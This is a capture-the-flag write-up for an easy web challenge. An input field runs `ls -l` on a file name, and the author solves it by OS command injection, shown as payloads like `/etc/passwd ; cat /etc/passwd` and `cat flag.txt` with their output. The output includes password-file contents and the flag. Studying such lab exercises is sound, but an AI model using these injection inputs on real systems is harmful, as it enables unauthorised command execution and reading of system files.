# Confidentiality
easy | web | 50 points

>My school was trying to teach people about the CIA triad so they made all these dumb example applications... as if they know anything about information security. Can you prove these aren't so secure?

This application included an input field. Enter a file name and the access control settings would appear. I tried **/etc/passwd** as sample input.

<img src="images/0-website.png" style="width: 70%"/>

From the output, this looks like the result from the `ls -l` command in `bash`.

As this is running shell commands, we can use `cat` to output the flag. But first, we need to know where the flag is and a way to run a `cat` command (this application currently only runs the `ls` command).

I tried the input `/etc/passwd ; cat /etc/passwd` to check if this would display the file permissions + the contents of **/etc/passwd**, and it did!

```
-rw-r--r-- 1 root root 1016 Sep 9 19:35 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/noloain
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

Now that we know this works, time to find the flag. I typed `ls` to check if there was anything in the current directory, and I found the flag!

```
-rw-r--r-- 1 root root 1016 Sep 9 19:35 /etc/passwd
flag.txt
main.py
requirements.txt
templates
```

All that was left to do is add the command `cat flag.txt` and its done!

```
-rw-r--r-- 1 root root 1016 Sep 9 19:35 /etc/passwd
flag{e56abbce7b83d62dac05e59fble81c68}
```

Flag: `flag{e56abbce7b83d62dac05e59fb1e81c68}`